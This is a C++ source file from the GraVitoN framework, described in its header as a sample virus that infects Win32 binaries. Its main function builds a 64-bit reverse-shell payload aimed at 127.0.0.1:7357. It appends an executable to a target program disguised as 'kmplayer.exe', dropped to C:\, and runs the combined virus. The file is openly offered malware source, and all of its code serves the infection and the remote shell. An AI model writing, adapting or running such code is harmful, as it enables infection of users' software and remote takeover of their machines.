/**
 * @file
 *
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Sample Virus For Linux, Infects Win32 Binary
 *
*/

/// Activate/Deactivate GraVitoN logger
// #define GVN_ACTIVATE_LOGGER
/// Print logs into a file
//#define GVN_LOG_INTO_FILE
/// Path to Log File
//#define GVN_LOG_FILE "./graviton_logs.txt"

#include <graviton.hpp>
#include <ai/virus_sample.hpp>
#include <infect/generic/endoffile.hpp>
#include <payload/linux/msf_shell_reverse_64.hpp>

int main()
{
    GraVitoN::Payload::Linux_MSF_Shell_Reverse_64 pay;
    pay.initialize("127.0.0.1", 7357);

    GraVitoN::Infect::EndOfFile infect;
    infect.initialize(	" Decom=Win32 "
                        " Target=decom/target.exe "
                        " DecTarget='kmplayer.exe' "
                        " DecTargetPath='' "
                        " NumFiles=1 "
                        " File1=graviton.exe "
                        " DecFile1=graviton.exe "
                        " DecFilePath1='C:\\' "
                        " IsExec1=true ");

    GraVitoN::AI::Virus_Sample viri(pay, infect);

	viri.run();

	return 0;
}
